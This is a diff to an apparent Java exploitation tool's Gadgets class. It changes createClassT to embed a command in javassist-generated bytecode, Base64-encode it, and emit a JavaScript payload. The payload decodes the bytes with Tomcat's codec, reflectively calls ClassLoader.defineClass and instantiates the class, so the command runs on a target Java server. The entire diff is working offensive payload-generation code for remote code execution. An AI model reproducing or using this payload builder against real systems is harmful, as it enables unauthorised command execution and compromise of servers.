@@ -7,10 +7,12 @@ import javassist.ClassClassPath;
 import javassist.CtClass;
 import javassist.CtConstructor;
 
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -153,7 +155,7 @@ public class Gadgets extends ClassLoader {
         return templates;
     }
 
-    public static Class<?> createClassT(String command) throws Exception {
+    public static String createClassT(String command) throws Exception {
         command = command.trim();
 
         // 支持单双引号
@@ -203,7 +205,22 @@ public class Gadgets extends ClassLoader {
             }
         }
 
-        return ctClass.getClass();
+        byte[] bytes = ctClass.toBytecode();
+        String classCode = Base64.getEncoder().encodeToString(bytes);
+        //System.out.println("Base64 Encoded CtClass: " + classCode);
+        ctClass.detach();
+
+        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
+                "try{\n" +
+                "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
+                "   clazz.newInstance();\n" +
+                "}catch(err){\n" +
+                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                "   method.setAccessible(true);\n" +
+                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                "   clazz.newInstance();\n" +
+                "};";
     }
 
     public static String createClassB(String command) throws Exception {
